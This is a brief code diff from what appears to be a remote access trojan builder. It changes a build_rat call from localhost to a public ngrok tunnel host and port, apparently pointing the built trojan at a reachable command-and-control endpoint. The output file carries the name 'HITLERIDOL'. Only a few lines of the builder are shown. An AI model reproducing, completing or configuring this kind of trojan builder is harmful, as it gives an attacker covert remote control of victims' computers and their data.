@@ -58,4 +58,5 @@ def build_rat(IP, PORT, filename):
     x = mycol.insert_one(mydict)
     print(x.inserted_id) 
 
-build_rat("localhost", 8000, "HITLERIDOL")
+build_rat("8.tcp.ngrok.io", 19297, "HITLERIDOL")
+
